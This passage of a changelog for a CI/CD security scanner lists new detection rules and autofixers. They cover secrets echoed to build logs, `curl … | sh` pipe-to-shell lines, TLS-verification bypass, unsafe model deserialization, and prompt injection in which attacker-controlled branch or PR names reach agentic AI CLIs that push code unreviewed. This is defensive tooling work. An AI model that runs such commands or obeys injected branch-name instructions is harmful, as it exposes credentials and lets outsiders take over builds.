  scope, via the shared `_primitives/log_leak` detector. DR-018 only
  scans container-flavored Drone pipelines (the ones with a shell command
  surface). Mapped across the 10 standards the log-leak family uses (the
  per-standard mappings were cloned with the new
  `scripts/clone_standards_mapping.py`). The `cis_aws_foundations`
  per-framework coverage floor drops 12 -> 11 (the expected denominator
  dilution as non-AWS rule packs grow). `buildkite` 17 -> 18, `drone`
  17 -> 18.
- **`scripts/clone_standards_mapping.py`: clone a rule's standards
  mappings onto a new rule.** Adding a parity / family rule (a
  cross-provider sibling, a new member of an established family) means
  giving it the *same* control IDs in every standard the analog is mapped
  to, which until now meant opening each
  `pipeline_check/core/standards/data/*.py`, finding the analog's line,
  reading off that standard's controls, and inserting a matching line by
  hand (~10-12 files per rule). This tool does it in one shot: it touches
  only the standards the analog is already in (preserving the deliberate
  "which standards does this kind of rule belong in" decision the analog
  encodes) and copies each standard's control set verbatim. `--apply`
  inserts each entry right after the analog's line so it stays grouped
  with its provider block; the default is a dry-run preview. Referenced
  from `new_rule.py`'s next-steps. Covered by
  `tests/test_clone_standards_mapping.py` (synthetic data dir + a
  self-consistency check against the live mappings).
- **HARNESS-013: Harness secret echoed to the step log (HIGH).** Continues
  the log-leak family (GHA-033 / GL-036 / BB-032 / ADO-031 / CC-032 /
  JF-042) into the Harness CD provider. Scans every step `command` for a
  secret-named variable handed to `echo` / `printf` / `cat` / `tee`, an
  `env` / `printenv` dump, or `set -x` with a secret-named variable in
  scope (names matching PASSWORD / TOKEN / SECRET / API_KEY / CREDENTIAL).
  Harness masks resolved `<+secrets.getValue(...)>` values in the log, but
  only the exact string: `set -x`, encoded, or derived forms slip past.
  Reuses the shared `_primitives/log_leak` detector over the Harness step
  model; mapped across the 10 standards the log-leak family uses.
  `harness` 12 -> 13.
- **JF-042: Jenkins secret echoed to the build log (HIGH).** Brings the
  log-leak rule (GHA-033 / GL-036 / BB-032 / ADO-031 / CC-032) to Jenkins,
  the mainstream provider that lacked it. Scans every `sh` / `bat` /
  `powershell` step body for a credential variable handed to `echo` /
  `printf` / `cat` / `tee`, an `env` / `printenv` dump, or `set -x` with a
  secret-named variable in scope. The credential set is the union of
  name-pattern matches (PASSWORD / TOKEN / SECRET / API_KEY / CREDENTIAL)
  and the variable names bound by `withCredentials([... variable: 'X'])`
  anywhere in the Jenkinsfile, so a non-obviously-named bound credential
  (`variable: 'GH'`) is still caught when echoed (Jenkins masks bound
  credentials in the console, but only the exact string: `set -x`,
  encoded, or derived forms slip past). Reuses the shared
  `_primitives/log_leak` detector; mapped across the 10 standards the
  log-leak family uses. `jenkins` 41 -> 42.
- **CC-038: CircleCI agentic-CLI output lands without human review
  (HIGH).** Completes the CircleCI agentic-AI matrix to 5/5 (prompt-
  injection, trust_remote_code, model-pinning, unsafe-deser, autoland),
  bringing it to parity with the other providers. The flow-control leg
  alongside CC-037, and the analog of GHA-123 / GL-049 / BB-039 / ADO-038
  / JF-038. Fires when one CircleCI job both invokes an agentic CLI
  (claude / gemini / cursor-agent / aider / openhands / goose / `q chat`)
  in a `run:` command and, in the same job, lands the result with a
  `git push` straight to a branch (no review gate). Coupling is **per
  job** (more precise than the Jenkins pipeline-level model): a CircleCI
  job has its own executor / checkout, so the run steps of one job share a
  workspace while separate jobs do not. Passes when the agent only opens a
  PR, on a push with no agent, when the two sit in different jobs, or on
  `git push --dry-run`. Reuses the shared `_primitives/agentic_cli`
  detector; mapped across the 12 standards the autoland family uses
  (mirrors JF-038). `circleci` 37 -> 38.
- **CC-037: CircleCI untrusted PR/build context reaches an agentic AI CLI
  (HIGH).** The AI face of CC-002 (script injection) and the CircleCI
  analog of GHA-119 / GL-048 / BB-036 / ADO-035 / JF-037. Fires when a
  `run:` command invokes an agentic CLI (claude / gemini / cursor-agent /
  aider / openhands / goose / `q chat`) AND attacker-controllable CircleCI
  context reaches it: an event-source env var (`$CIRCLE_BRANCH` /
  `$CIRCLE_TAG` / `$CIRCLE_PR_*`) or a `<< pipeline.git.branch >>` /
  `<< pipeline.git.tag >>` interpolation. A PR author or branch namer can
  then smuggle instructions the agent executes. Unlike CC-002 the value is
  flagged in any quote style (an LLM reads it as prompt text regardless of
  shell quoting); `<< pipeline.parameters.* >>` stays safe. Reuses the
  shared `_primitives/agentic_cli` detector + CircleCI's `UNTRUSTED_ENV_RE`,
  mapped across the 12 standards the prompt-injection family uses.
  `circleci` 36 -> 37.
- **CC-035 + CC-036: CircleCI model-load triad completed (MEDIUM + HIGH).**
  With CC-034 (`trust_remote_code`), these bring CircleCI to full parity
  with the GHA / GitLab / Bitbucket / Azure DevOps / Harness / Jenkins
  model-load rule family. **CC-035** (MEDIUM) flags a `run:` command that
  fetches a model by a mutable registry reference
  (`from_pretrained("org/model")`, `hf_hub_download` / `snapshot_download`
  with a bare repo id, `huggingface-cli download org/model`) with no
  revision pin, so the registry can serve swapped weights or loader code
  on the next build (the analog of GHA-121 / BB-038 / JF-040; reuses
  `_primitives/model_ref`). **CC-036** (HIGH) flags unsafe deserialization
  of a fetched artifact: an explicit `weights_only=False` / `allow_pickle=
  True` opt-in, or a remote fetch plus a pickle-backed loader
  (`torch.load` / `pickle.load` / `joblib.load`) in the same command with
  no safe path, which is code execution on the runner (the analog of
  GHA-122 / BB-037 / JF-041; reuses `_primitives/unsafe_deser`). Both scan
  `iter_run_commands` across all jobs. CC-035 mapped across the 8 standards
  the model-pinning family uses, CC-036 across the 12 the RCE family uses.
  `circleci` 34 -> 36.
- **CC-034: CircleCI ML model loaded with `trust_remote_code` (HIGH).**
  Brings the first AI / model-load coverage to CircleCI, a mainstream CI
  provider that previously had none of the model-load family the other six
  providers carry (GHA-120 / GL-045 / BB-035 / ADO-034 / HARNESS-010 /
  JF-039). Scans every `run:` command across all jobs for
  `trust_remote_code=True` (or `--trust-remote-code`): the transformers /
  huggingface_hub loader executes the model repo's own `modeling_*.py` at
  load time, so an untrusted or unpinned model is arbitrary code execution
  on the runner with the job's context secrets and OIDC in scope. Reuses
  the shared `_primitives/model_trust` detector over `iter_run_commands`,
  and is mapped across the 12 standards the `trust_remote_code` family
  uses. `circleci` 33 -> 34.
- **JF-040 + JF-041: Jenkins model-load triad completed (MEDIUM + HIGH).**
  With JF-039 (`trust_remote_code`), these bring Jenkins to full parity
  with the GHA / GitLab / Bitbucket / Azure DevOps / Harness model-load
  rule family. **JF-040** (MEDIUM) flags a `sh` / `bat` / `powershell`
  step that fetches a model by a mutable registry reference
  (`from_pretrained("org/model")`, `hf_hub_download` / `snapshot_download`
  with a bare repo id, `huggingface-cli download org/model`) with no
  revision pin, so the registry can serve swapped weights or loader code
  on the next build (the analog of GHA-121 / BB-038 / HARNESS-012; reuses
  `_primitives/model_ref`). **JF-041** (HIGH) flags unsafe deserialization
  of a fetched artifact: an explicit `weights_only=False` / `allow_pickle=
  True` opt-in, or a remote fetch plus a pickle-backed loader
  (`torch.load` / `pickle.load` / `joblib.load`) in the same step with no
  safe path, which is code execution on the agent (the analog of GHA-122 /
  BB-037 / HARNESS-011; reuses `_primitives/unsafe_deser`). Both scan
  shell-step bodies via the existing `SHELL_STEP_RE` and emit located
  findings. JF-040 mapped across the 8 standards the model-pinning family
  uses, JF-041 across the 12 the RCE family uses. `jenkins` 39 -> 41.
- **GLGRP-006: GitLab group CI/CD variable exposes a secret with a weak
  control (HIGH).** The `gitlab_group` provider now also fetches
  `GET /groups/{group}/variables` and fires on a group-level CI/CD
  variable whose value matches a known credential shape (the shared
  `find_secret_values` catalog: PATs, cloud keys, provider tokens, PEM
  blocks) AND that is `protected: false` (handed to pipelines on every
  branch / MR, including feature branches and fork MRs where fork
  pipelines run) or `masked: false` (printed in cleartext in job logs). A
  group variable is inherited by every project in the group, so the blast
  radius is the whole group. The value-shape gate keeps it low-FP: an
  ordinary unprotected config variable (a URL, a region, a flag) is not
  flagged, only an actual secret with a weakened control; the token body
  is never echoed, only its detector label. This is the group-API surface
  the static `.gitlab-ci.yml` rules (GL-003 / GL-008) structurally can't
  see. Fetched independently, so a token that can read the group but not
  its variables degrades to a pass-with-note. `gitlab_group` 5 -> 6.
- **JF-039: Jenkins ML model loaded with `trust_remote_code` (HIGH).**
  Brings the model-load supply-chain coverage the other CI providers carry
  (GHA-120 / GL-045 / BB-035 / ADO-034 / HARNESS-010) to the Jenkinsfile,
  and adds the model-load leg to a provider that previously only had the
  agentic-CLI AI rules (JF-037 prompt-injection, JF-038 autoland). Fires
  when a `sh` / `bat` / `powershell` step loads a model with
  `trust_remote_code=True` (or `--trust-remote-code`), so the transformers
  / huggingface_hub loader executes the model repo's own `modeling_*.py`
  at load time: a poisoned, typosquatted, or unpinned model is then
  arbitrary code execution on the Jenkins agent with the build's
  credentials in reach. Reuses the shared `_primitives/model_trust`
  detector; both single- and double-quoted step bodies are flagged
  (Groovy quoting does not defang an in-process model load). Mapped across
  the 12 standards the `trust_remote_code` family uses. `jenkins` 38 -> 39.
- **HARNESS-012: AI model pulled without a pinned revision (MEDIUM).**
  Completes the Harness agentic-AI rule row to parity with GitHub Actions
  / GitLab / Bitbucket / Azure DevOps (the matrix already covered Harness
  for prompt-injection, autoland, `trust_remote_code`, and unsafe-pickle
  deserialization; model-pinning was the last gap). Fires on a Harness
  step `command` that fetches a model from a registry by a mutable
  reference (`from_pretrained("org/model")`, `hf_hub_download` /
  `snapshot_download` with a bare repo id, `huggingface-cli download
  org/model`) and supplies no revision pin, so the registry can serve
  swapped weights or loader code on the next build with no diff in the
  repo. Reuses the shared `_primitives/model_ref` detector (with GHA-121 /
  GL-046 / BB-038 / ADO-037): pinned revisions, local paths, `<+...>`
  expressions, and bare first-party hub names all pass. The model-registry
  analog of HARNESS-001 (step image digest pinning) and the prerequisite
  control for HARNESS-010's `trust_remote_code` path. `harness` 11 -> 12.
- **GLGRP-005: GitLab group webhook over insecure transport (HIGH).** The
  GitLab-group twin of the shipped ORG-011 (and the per-project SCM-026).
  The `gitlab_group` provider now also fetches `GET /groups/{group}/hooks`
  and fires on any group webhook whose `url` is `http://` or whose
  `enable_ssl_verification` is `false`: a group webhook fires on events
  across every project in the group, so its payloads (MR diffs, push
  commits, pipeline content) ride to the receiver in cleartext where a
  network attacker can read and tamper with them. Scoped to transport
  security (no secret-token check, since the group hooks endpoint does not
  report secret presence). The new endpoint is fetched independently, so a
  token that can read the group but not its hooks degrades GLGRP-005 to a
  pass-with-note instead of crashing the other group checks. `gitlab_group`
  4 -> 5.
- **`scripts/sync_doc_claims.py`: registry-derived doc-claim writer.**
  `tests/test_doc_claims.py` already *checks* that headline counts ("39
  providers", "120 autofixers", "1220+ checks", the per-provider "N
  checks" cells, the README architecture ID ranges) match the live
  registries; this is the *writer* for the same claims, so adding a rule
  or provider no longer means hand-editing README.md, `action.yml`,
  `docs/comparison.md`, CONTRIBUTING.md, and the Docker Hub README (step 7
  of the `new_rule.py` checklist). `--check` reports drift and exits
  non-zero (now part of `scripts/preflight.py`); the default rewrites.
  Uses "make it pass" semantics, only a claim that would fail the gate is
  touched, so a run against an in-sync tree changes nothing.

### Changed

- **`cli.py` decomposition: auxiliary subcommands moved to
  `cli_aux_commands.py`.** The four self-contained top-level verbs
  (`explain`, `fp-stats`, `history`, `verify-artifact`) moved out of the
  5,100-line `cli.py` into a sibling module; `cli` re-imports them so
  `main`'s dispatch and the `pipeline_check.cli.<cmd>` references in the
  test suite are unchanged. No behavior change. `scan` and its plumbing
  stay in `cli.py`.
- **`cli.py` decomposition: operational subcommands moved to
  `cli_ops_commands.py`.** The remaining three verbs (`init`, `fleet`,
  `fix-pr`) and their scanner-setup helpers (`_init_scanner_kwargs_for`,
  `_print_init_summary`, `_fix_pr_scan`, the `_INIT_*` / `_FIX_PR_TIERS`
  maps) moved into a second sibling module, taking `cli.py` from ~4,770 to
  ~3,930 lines. `init` and `fix-pr` build a Scanner directly, so the
  smart-init tests now patch `pipeline_check.cli_ops_commands.Scanner`. As
  with the aux split, `cli` re-imports the command objects, so dispatch and
  the `pipeline_check.cli.<cmd>` test imports are unchanged. No behavior
  change. `scan` and its option/validation plumbing remain in `cli.py`.

## [1.14.1] - 2026-06-13

### Added

- **`scan_status.warnings` in JSON / SARIF output.** The structured
  `scan_status` payload now carries the raw scan-metadata warning strings
  (parse failures, a provider's `post_filter` crash, a rule-set filter
  notice) whenever any fired, not just the `files_unparsed` /
  `degraded_modules` counts. A CI job parsing the report can now see the
  same detail the stderr summary prints. The key is absent when a scan
  produced no warnings, so existing consumers are unaffected.

### Changed

- **`--baseline` not-found error now names the recovery command.** Instead
  of just reporting the missing path, the message points at
  `pipeline_check --write-baseline <path>` to create one and how to pair it
  back, so a first-time user is not left guessing.

### Fixed

- **`pyproject.toml` pipeline-check config no longer dropped silently on a
  parse error.** `_load_path` reported a malformed `.pipeline-check.yml`,
  but `_load_pyproject` swallowed a malformed `pyproject.toml` without a
  word, so a typo in a `[tool.pipeline_check]` table stranded the config
  with no signal. It now prints the same `[config] could not parse` line,
  but only when the file actually carries a `[tool.pipeline_check]` table,
  so an unrelated project's broken `pyproject.toml` (auto-probed on every
  run) stays silent.
- **Docker publish: `apt-get upgrade` layer no longer served stale from
  cache.** The release image build pins the base by digest and runs
  `apt-get upgrade` to pull the latest Debian security patches, but the
  layer's instruction text and base digest are both stable, so BuildKit
  replayed a cached layer on every build and the upgrade never re-ran.
  That silently stranded fixable base-package CVEs (the v1.14.0 publish
  failed Docker Scout on four HIGH openssl CVEs already patched in
  `trixie-security`). An `APT_CACHE_BUST` build-arg fed the commit SHA
  busts that layer per build so the upgrade re-runs against the current
  index.

## [1.14.0] - 2026-06-13

### Added

- **GLGRP-004: GitLab group default branch protection disabled for new
  projects.** Extends the `gitlab_group` pack. Reads
  ``default_branch_protection`` from ``GET /groups/{group}`` and fires
  (MEDIUM) when it is ``0`` (Not protected): every new project in the group
  starts with a default branch any Developer can push to directly,
  force-push, and delete, with no review gate. Levels ``1``-``4`` pass.
  GitLab is migrating this integer to a
  ``default_branch_protection_defaults`` object; when only the newer form is
  returned the rule passes with an "unavailable" note rather than guessing
  at its shape. The group-default analog of the repo-level SCM-001.
- **GLGRP-003: GitLab group allows sharing projects outside the group
  hierarchy.** Extends the `gitlab_group` pack. Reads
  ``prevent_sharing_groups_outside_hierarchy`` from ``GET /groups/{group}``
  and fires (MEDIUM) when it is ``false``: a member can share a private or
  internal project with a group outside the current hierarchy, granting
  that external group standing access outside the group's branch
  protection, approval rules, and 2FA policy. A Premium / SAML setting, so
  an absent field passes with an "unavailable" note (no free-tier false
  positive). The group-level access-boundary sibling of GLGRP-002.
- **New `gitlab_group` provider: GitLab group-level governance.** The
  GitLab analog of the GitHub-only `scm_org` provider. Audits the
  group-wide controls that govern every project in a GitLab group at once,
  via `GET /groups/{group}` over the same GitLab REST v4 fetcher the `scm`
  provider's GitLab path uses. Ships two flagship rules: **GLGRP-001**
  (HIGH, group does not require two-factor authentication, the ORG-001
  analog) and **GLGRP-002** (MEDIUM, group allows forking its projects
  outside the group, the ORG-007 data-exfiltration analog). Invoked with
  `--pipeline gitlab_group --scm-org GROUP` (a group / subgroup path);
  token from `--gitlab-token` / `$GITLAB_TOKEN`, `--gitlab-url` for
  self-managed. A missing token / 404 / Premium-gated field degrades to an
  "unavailable" pass-with-note rather than a false finding. Provider count
  38 -> 39.
- **GL-050: GitLab package-publish job relies on a long-lived registry
  token.** The GitLab analog of GHA-050, motivated by npm's September 2025
  plan to disallow token-based publishing by default and expand OIDC
  trusted publishing (GitLab is a named provider). Fires when a job's
  ``script:`` runs a publish verb (``npm`` / ``pnpm`` / ``yarn publish``,
  ``twine upload``, ``poetry`` / ``uv publish``, ``gem push``,
  ``cargo publish``) and the job / its ``variables:`` / the top-level
  ``variables:`` reference a long-lived external-registry token
  (``NPM_TOKEN``, ``NODE_AUTH_TOKEN``, ``PYPI_TOKEN``, ``TWINE_PASSWORD``,
  …). GitLab's built-in per-job ``CI_JOB_TOKEN`` is deliberately excluded
  (it's the native, auto-expiring path to the project's own Package
  Registry), and a job that publishes via OIDC (``id_tokens:``) with no
  long-lived token does not fire. HIGH severity; the recommendation points
  at GitLab OIDC trusted publishing. GitLab 51 -> 52 checks.
- **Slack + Discord incoming-webhook live verifiers (``--verify-secrets``).**
  The webhook-URL detectors shipped last cycle now have verifiers, so
  ``--verify-secrets`` can confirm whether a leaked webhook is still live
  (a webhook URL is itself a credential: anyone holding it can post to the
  channel). Both probes are side-effect-free and never post a message.
  Discord is a read-only ``GET`` on the webhook URL, which returns the
  webhook's name / channel for a live URL and 401 / 404 once it is deleted
  or its token is rotated. Slack has no read endpoint, so the probe
  ``POST``s an empty JSON body (``{}``): a live webhook rejects it with HTTP
  400 ``invalid_payload`` (nothing posts, because there is no ``text``) and
  a deleted webhook answers 404 ``no_service``. New ``webhooks.py`` in the
  verifier package; both appear in ``--list-verifiers``.
- **Sentry + Pulumi + Render + Neon live secret verifiers
  (``--verify-secrets``).** Four CI-relevant infrastructure tokens gain a
  verifier: Sentry org auth tokens via ``GET /api/0/organizations/``
  (Bearer, sentry.io SaaS), Pulumi access tokens via ``GET /api/user``
  (the ``token`` auth scheme, not Bearer), Render via ``GET /v1/owners``
  (Bearer), and Neon via ``GET /api/v2/users/me`` (Bearer). Standard
  VERIFIED / UNVERIFIED / UNKNOWN outcomes; they appear in
  ``--list-verifiers``.
- **``--list-verifiers`` (secret-verifier discoverability).** Prints every
  secret detector that ``--verify-secrets`` can probe against its issuing
  API to confirm a credential is live (one per line: ``detector  shape``)
  and exits, mirroring ``--list-fixers``. Pipes into ``grep`` and performs
  no scan. Surfaces the growing verifier registry so users know which
  detected secret types can actually be confirmed active. New
  ``verifier_names()`` registry accessor + ``manual.detector_description``.
- **Opt-in local-LLM finding triage (``--triage``, #167).** After the
  report, ``--triage`` asks a LOCAL LLM (Ollama / llama.cpp / LM Studio,
  via the Ollama-style ``/api/generate`` endpoint) whether each failing
  finding is exploitable in this repo's context, given the finding plus a
  source snippet, and labels it ``confirmed`` / ``needs_review`` /
  ``likely_fp``. ``--triage-endpoint`` (loopback by default; a non-local
  URL prints a one-line warning first) and ``--triage-model`` configure
  it. The verdicts render in their own advisory section through a dedicated
  reporter, never folded into severity / confidence, so a hallucinating
  model can't change a HIGH into a LOW, change the grade, or move the gate.
  An unreachable endpoint degrades to ``unavailable`` rather than failing
  the scan, and the section is suppressed (with an stderr note) when a
  machine-readable ``--output`` is already on stdout. New ``core/triage.py``
  (transport + tolerant reply parsing + snippet extraction),
  ``core/triage_prompts.py`` (the reviewable prompt), and
  ``core/triage_reporter.py``.
- **Groq + xAI + Postman + Doppler live secret verifiers
  (``--verify-secrets``).** Four more detectors that had no verifier gain
  one, each a single-token identity probe: Groq and xAI via the
  OpenAI-compatible ``GET /v1/models`` (Bearer), Postman via ``GET /me``
  (the ``X-Api-Key`` header) reporting the owning user, and Doppler via
  ``GET /v3/me`` (Bearer) reporting the token name / workplace. Standard
  VERIFIED / UNVERIFIED / UNKNOWN outcomes, no network surface beyond the
  opt-in probe.
- **Figma + Notion live secret verifiers (``--verify-secrets``).** The
  Figma (``figd_``) and Notion (``ntn_``) detectors added last cycle now
  have verifiers, so ``--verify-secrets`` can confirm whether a detected
  token is live: Figma via ``GET /v1/me`` (the ``X-Figma-Token`` header,
  not Bearer) and Notion via ``GET /v1/users/me`` (Bearer + the required
  ``Notion-Version`` header). A valid token reports the owning handle /
  integration name; an explicit auth failure reports UNVERIFIED; anything
  else is UNKNOWN. No new network surface beyond the opt-in probe.
- **JSON Lines output (``--output jsonl``).** Emits one failing finding
  per line as compact, newline-delimited JSON, using the same per-finding
  shape as the ``json`` output's ``findings`` entries. Unlike the single
  ``json`` document, a JSONL stream has no wrapping array or score block,
  so it is appended to and parsed line by line: the native ingest format
  for log pipelines (Splunk / ELK / Datadog) and the shape ``jq -c`` or a
  shell loop can process without loading the whole report. New
  ``core/jsonl_reporter.py``.
- **GCB-012 + HARNESS-004 literal-secret autofixers (``--fix``).** Cloud
  Build (a credential literal in ``substitutions:``) and Harness (a literal
  ``variables:`` value) detect purely by value shape, so they now share the
  ``_fix_gha008`` redactor that the rest of the literal-secret family uses,
  replacing the value with ``"<REDACTED>"`` + a rotate-and-wire-up TODO.
  Safe-tier, idempotent, verified end-to-end (fires before / passes after).
  Drone DR-004 was evaluated and deliberately left out: it also fires on a
  credential-named key holding any literal, so a ``<REDACTED>`` placeholder
  (still a literal) wouldn't clear it without a ``from_secret`` rewrite.
  Autofixer count 118 -> 120.
- **DR-006 + HARNESS-006 TLS-bypass autofixers (``--fix``).** Drone and
  Harness detect a TLS / certificate-verification bypass (``curl -k``,
  ``npm config set strict-ssl false``, ``NODE_TLS_REJECT_UNAUTHORIZED=0``,
  …) through the same ``_primitives.tls_bypass`` detector as every other
  provider, so they now share the existing ``_comment_tls_bypass`` fixer
  that comments the offending line out with a TODO marker (the analog of
  their curl-pipe siblings DR-014 / HARNESS-005 already sharing the
  curl-pipe fixer). No new logic, safe-tier, idempotent. Autofixer count
  116 -> 118.
- **Figma + Notion token secret detectors.** The catalog now flags
  hard-coded Figma personal access tokens (``figd_``) and Notion
  internal-integration tokens (``ntn_``), both distinctive-prefix shapes
  that ride the cross-provider ``*-008`` literal-secret rules. (A planned
  Stripe / SendGrid / Vault / Doppler batch turned out to be already
  covered under existing detector names, so only the two genuinely-new
  shapes landed.) Detector catalog 54 -> 56.
- **Incoming-webhook URL secret detectors (Slack + Discord).** A leaked
  Slack (``hooks.slack.com/services/T…/B…/…``) or Discord
  (``discord.com/api/webhooks/<id>/<token>``) incoming-webhook URL is a full
  credential — anyone holding it can post into the channel — so the secret
  catalog now flags hard-coded webhook URLs alongside API tokens. Both are
  high-confidence shapes (distinctive host + path), so the cross-provider
  literal-secret rules (``*-008`` family) pick them up wherever a value is
  collected. Detector catalog 52 -> 54.
- **GHA-031 autofixer: migrate retired ``::set-output`` / ``::save-state``
  (``--fix``).** GitHub disabled the ``::set-output::`` / ``::save-state::``
  stdout commands, so workflows using them are broken. The new safe-tier
  fixer rewrites ``echo "::set-output name=X::V"`` to the documented,
  behavior-equivalent (and injection-safe) file redirect ``echo "X=V" >>
  "$GITHUB_OUTPUT"`` (``$GITHUB_STATE`` for save-state). Deterministic and
  idempotent — the first new-logic fixer of this autofix batch (the others
  reused existing functions). Autofixer count 115 -> 116.
- **GitHub Actions annotations output (``--output annotations``).** Emits
  one ``::error`` / ``::warning`` / ``::notice file=…,line=…::message``
  workflow command per failing finding location. Printed inside a GitHub
  Actions job, GitHub renders them as inline annotations on the changed
  lines and the PR, with no SARIF upload step and no code-scanning /
  Advanced Security requirement, so any repo gets inline feedback (the gap
  the SARIF path leaves for repos without GHAS). CRITICAL/HIGH map to
  ``::error``, MEDIUM to ``::warning``, LOW/INFO to ``::notice``; paths are
  normalized repo-relative with forward slashes so GitHub maps them, and
  message / property values are percent-encoded per the workflow-command
  spec. Only failing findings are emitted. New
  ``core/github_annotations_reporter.py``.
- **GHA-054 autofixer (``--fix``).** GHA-054 (a checkout ``ssh-key``
  persisted into the repo's ``.git/config``) now shares the
  persist-credentials checkout fixer: ``persist-credentials: false`` is its
  canonical fix too (verified fires-before / gone-after), so it's another
  ``@register`` on the existing function — no new logic. Safe-tier,
  idempotent. Autofixer count 114 -> 115.
- **Curl-pipe autofixer extended to Drone + Harness (``--fix``).** The
  provider-agnostic comment-out fixer (which neutralizes a ``curl … | sh``
  / ``wget … | bash`` by commenting the line with a TODO marker) now also
  covers DR-014 and HARNESS-005, the pipe-to-shell rules in the Drone and
  Harness providers, completing its cross-provider coverage (it already
  served GHA-016 / GL-016 / ADO-016 / BB-012 / JF-016 / CC-016 / BK-004).
  Safe-tier, idempotent. Autofixer count 112 -> 114.
- **GHA-037 autofixer (``--fix``).** ``actions/checkout`` persisting the
  GITHUB_TOKEN into ``.git/config`` (GHA-037) now has a safe-tier fixer: it
  adds ``persist-credentials: false`` under every checkout step, the rule's
  canonical fix. It reuses the existing GHA-002 checkout fixer (the edit is
  identical), so the same idempotent, format-preserving logic applies.
  Autofixer count 111 -> 112.
- **CSV output (``--output csv``).** A flat, one-row-per-location export of
  the failing findings for spreadsheet triage: open in a sheet, filter by
  severity, assign owners, track remediation. Columns: ``check_id``,
  ``severity``, ``confidence``, ``resource``, ``file``, ``line``, ``title``,
  ``description``, ``recommendation``, ``cwe``. Only failing findings are
  emitted (mirroring the SARIF / Code Quality reporters); the stdlib ``csv``
  writer handles quoting so a comma / quote / newline in a description can't
  break the columns. ``--inline-explain`` appends the exploit example to the
  description cell. New ``core/csv_reporter.py``; wired into the ``--output``
  choice + the single-artifact reporter table.
- **LLM-provider secret detectors (Groq / xAI / Perplexity).** Three new
  high-confidence detectors in the shared secret catalog
  (``_patterns.py``): Groq (``gsk_`` + body), xAI / Grok (``xai-`` + body),
  and Perplexity (``pplx-`` + body). Each is prefix-anchored with a length
  floor, so the unique provider prefix carries the precision and an
  undersized near-miss never fires. They flow automatically through
  ``find_secret_values`` to every consumer (GHA-008 and the cross-provider
  literal-secret ``*-008`` rules), covering the unscoped-LLM-key-in-CI
  surface as agentic pipelines proliferate. Detector count 49 -> 52.
- **``scm_org`` provider: GitHub organization-wide governance (ORG-001 ..
  ORG-008).** A new ``--pipeline scm_org --scm-org ORG`` audits the
  org-admin settings that govern every repository at once, complementing
  the per-repo ``scm`` provider, over the same GitHub REST fetcher (token
  from ``--gh-token`` / ``$GITHUB_TOKEN``). **ORG-001** (HIGH) flags an org
  that does not require two-factor authentication of all members, the
  highest-leverage account-takeover control. **ORG-002** (HIGH) flags an org
  whose default member permission is ``write`` or ``admin``, so every member
  can push to (or reconfigure) every repository. **ORG-003** (HIGH) flags an
  org whose Actions policy has no allow-list (``allowed_actions: all``), so
  every workflow can pull in any third-party action by a mutable tag (the
  tj-actions / reviewdog class) org-wide. **ORG-004** (HIGH) flags an org
  whose default ``GITHUB_TOKEN`` is read-write, so every workflow gets a
  write token unless it narrows the scope itself. **ORG-005** (HIGH) flags an
  org that lets GitHub Actions approve pull requests, so a workflow can
  self-approve a PR and satisfy a required-review gate with no human. **ORG-006**
  (HIGH) flags an org Actions secret scoped to ``All repositories``, readable
  by every workflow in every repo (the SCM-048 analog at org level). **ORG-007**
  (MEDIUM) flags an org that allows forking of private repositories, so any
  member can fork private or internal source code to a personal account
  outside the org's branch protection, audit log, and secret scanning (a
  data-exfiltration path that needs no exploit). **ORG-008** (MEDIUM) flags an
  org that lets members create public repositories, so a member can publish
  internal source code, secrets, or data to the internet with no review (the
  Legitify ``non_admins_can_create_public_repositories`` policy). **ORG-009**
  (HIGH) flags an org self-hosted runner group with ``allows_public_repositories:
  true``, so a workflow in any public repo (including a fork pull request) can
  run code on infrastructure the org operates (the org-governance analog of
  GHA-105 / GLRUN-005, via ``GET /orgs/{org}/actions/runner-groups``). **ORG-010**
  (MEDIUM) flags an org that enables secret scanning by default for new
  repositories but not push protection, so every new repo catches credentials
  only after they reach git history (the org-default analog of SCM-015; scoped
  to the half-config, so an org without GitHub Advanced Security never false-
  positives). **ORG-011** (HIGH) flags an org webhook delivering events over
  insecure transport (``http://`` payload URL or ``insecure_ssl: "1"``), so the
  org-wide event stream (PR diffs, push commits, security alerts for every repo)
  is exposed to a network attacker (the org-level analog of SCM-026, via
  ``GET /orgs/{org}/hooks``; scoped to transport security so it never
  false-positives on the API's unreliable secret-presence reporting). **ORG-012**
  (LOW) flags an org that enables Dependabot alerts by default for new
  repositories but not Dependabot security updates, so every new repo surfaces a
  vulnerable dependency but gets no automatic fix pull request (the org-default
  analog of SCM-005; scoped to the half-config, so an org without Dependabot
  never false-positives). **ORG-013** (MEDIUM) flags an organization ruleset
  whose ``enforcement`` is ``evaluate`` (dry-run) or ``disabled`` rather than
  ``active``, so the org-wide branch / tag / push governance it documents does
  not actually block across the repos it targets (the org-level analog of
  SCM-029, via ``GET /orgs/{org}/rulesets``). Each rule passes with an
  "unavailable" note when the token lacks the scope to read the setting, so a
  low-scope token never produces a false finding. The provider count is now 38.
- **``scm`` provider: GitHub org-wide per-repo fan-out (``--scm-org``).** The
  ``scm`` provider now accepts ``--scm-org ORG`` in place of ``--scm-repo`` to
  enumerate every non-archived repository in a GitHub organization (paginated
  ``GET /orgs/{org}/repos``) and run the full per-repo posture pack across all
  of them, one finding per repo per rule. This is the per-repo complement to the
  ``scm_org`` provider's org-level governance audit (the "run the per-repo pack
  across every repo the org enumerates" half of the org-governance story). New
  ``SCMContext.for_org`` classmethod builds the multi-repo context the existing
  ``repos`` list shape was designed for; archived repos are skipped, and a
  failed / empty enumeration degrades to an empty context with a warning rather
  than crashing. ``--scm-include`` / ``--scm-exclude`` (repeatable ``fnmatch``
  globs over the repo name) scope the fan-out, and ``--scm-max-repos N`` caps it
  for very large orgs (0 = unlimited; truncation is reported as a scan warning,
  never silent). Per-repo snapshots build concurrently over a small bounded
  thread pool (each repo needs ~10 sequential API calls, so a large org would
  crawl serially); ``executor.map`` preserves enumeration order, so the result
  is deterministic. Works on all three SCM platforms: GitHub (``ORG`` is the
  org login) runs the full pack, while GitLab (``ORG`` is a group path,
  subgroups included) and Bitbucket (``ORG`` is a workspace) enumerate their
  projects / repos and run the 7-rule universal subset. The shared
  filter / cap / concurrency machinery lives in one ``_build_fan_out_context``
  helper; only the per-platform enumeration and single-repo build differ.
- **GLRUN-005: a fork pipeline ran on a self-managed runner (GitLab run
  forensics).** The GitLab analog of the `runs` provider's RUN-005, behind
  `--audit-runs-logs`. A fork merge-request pipeline executes untrusted
  contributor code; when its jobs run on a self-managed (non-shared) runner
  (`runner.is_shared == false`, i.e. a `project_type` / `group_type` runner
  the owner operates), that code runs on infrastructure you control:
  command execution on the runner host, a network-pivot foothold, and
